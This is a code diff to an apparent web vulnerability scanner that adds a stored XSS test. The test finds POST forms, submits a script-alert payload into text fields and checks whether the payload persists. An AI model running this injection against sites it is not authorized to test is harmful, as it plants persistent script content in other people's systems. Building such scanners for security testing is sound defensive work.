@@ -2,6 +2,7 @@
 Real payload injection + context-aware detection. No false positives."""
 
 import re
+import time
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
 from core.logger import get_logger
 
@@ -348,6 +349,91 @@ def run(client, config, crawl_result=None) -> dict:
                         result["vulnerable"].append(finding)
                         log.warning(f"  ⚠ XSS (POST) FOUND: {param_name} on {target[:60]}")
                         break  # next param
+
+    # === STORED XSS TESTING (ADDED 2026-09-20) ===
+    try:
+        import re as _re
+        from urllib.parse import urljoin as _urljoin
+        stored_forms = config.get("_crawl_forms_post", []) or []
+
+        if not stored_forms:
+            tgt = config.get("target", "")
+            resp_html = client.get(tgt)
+            if resp_html and resp_html.status == 200:
+                form_tags = _re.findall(r"<form[^>]*>", resp_html.text, _re.IGNORECASE)
+                form_bodies = _re.findall(r"<form[^>]*>(.*?)</form>", resp_html.text, _re.IGNORECASE | _re.DOTALL)
+                for i, tag in enumerate(form_tags):
+                    mm = _re.search(r'method=["\']?(\w+)', tag, _re.IGNORECASE)
+                    m = (mm.group(1) if mm else "GET").upper()
+                    if m != "POST":
+                        continue
+                    am = _re.search(r'action=["\']([^"\']*)["\']', tag, _re.IGNORECASE)
+                    act = am.group(1) if am else tgt
+                    if act and not act.startswith(("http://", "https://")):
+                        act = _urljoin(tgt, act)
+                    body_html = form_bodies[i] if i < len(form_bodies) else ""
+                    inputs = _re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', body_html, _re.IGNORECASE)
+                    inputs += _re.findall(r'<(?:textarea|select)[^>]+name=["\']([^"\']+)["\']', body_html, _re.IGNORECASE)
+                    if inputs:
+                        stored_forms.append({
+                            "action": act,
+                            "body": "&".join(n + "=test" for n in inputs),
+                            "fields": inputs,
+                        })
+
+        if stored_forms:
+            log.info("  Found " + str(len(stored_forms)) + " POST form(s) for Stored XSS test")
+
+        for form in stored_forms[:3]:
+            action = form.get("action", "")
+            body_template = form.get("body", "")
+            fields = form.get("fields", [])
+            if not action or not body_template or not fields:
+                continue
+            test_fields = [f for f in fields if any(
+                k in f.lower() for k in ("name", "message", "comment", "content", "text", "title", "body", "mtx")
+            )] or fields[:2]
+
+            for field in test_fields:
+                unique_marker = "FalconStored" + str(int(time.time()))
+                payload = "<script>alert('" + unique_marker + "')</script>"
+                parts = body_template.split("&")
+                new_parts = []
+                for p in parts:
+                    if "=" in p:
+                        k, v = p.split("=", 1)
+                        if k == field:
+                            new_parts.append(k + "=" + payload)
+                        else:
+                            new_parts.append(p)
+                    else:
+                        new_parts.append(p)
+                new_body = "&".join(new_parts)
+                result["tested"] += 1
+                try:
+                    client.request("POST", action, data=new_body,
+                        headers={"Content-Type": "application/x-www-form-urlencoded"})
+                    resp2 = client.get(action)
+                except Exception:
+                    continue
+                if not resp2 or resp2.status != 200:
+                    continue
+                if ("<script>alert('" + unique_marker + "')</script>") in resp2.text:
+                    log.warning("  STORED XSS in '" + field + "' on " + action[:60])
+                    result["vulnerable"].append({
+                        "url": action,
+                        "original_url": action,
+                        "injected_url": action,
+                        "test_url": action,
+                        "param": field,
+                        "payload": payload,
+                        "method": "POST",
+                        "severity": "high",
+                        "context_type": "stored",
+                    })
+                    break
+    except Exception as _e:
+        log.debug("Stored XSS test failed: " + str(_e))
 
     log.info(f"  ✓ Tested: {result['tested']}")
     log.info(f"  ⚠ Vulnerable: {len(result['vulnerable'])}")
